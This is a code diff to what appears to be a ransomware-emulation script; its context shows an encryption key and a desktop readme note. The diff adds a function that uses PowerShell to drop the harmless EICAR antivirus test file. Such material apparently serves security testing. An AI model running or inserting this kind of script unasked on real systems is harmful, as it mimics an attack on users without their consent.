@@ -5,6 +5,7 @@ import platform
 import urllib.request
 import pyautogui
 import shutil
+import subprocess
 
 # Generate key
 key=Fernet.generate_key()
@@ -163,6 +164,10 @@ def open_readme_on_desktop():
     else:
         print(f"{readme_filename} not found on the desktop.")
 
+# Download EICAR
+def eicarDownload():
+    subprocess.call('%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe set-content "X5O!P%@AP[4`\PZX54(P^)7CC)7}`$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`$H+H*" -path "eicar.com"', shell=True)
+
 # Back to desktop
 def backDesktop():
     # Simulate pressing Win + D
@@ -203,3 +208,6 @@ if __name__ == "__main__":
 
     #Back to Desktop
     backDesktop()
+
+    #Download EICAR
+    eicarDownload()
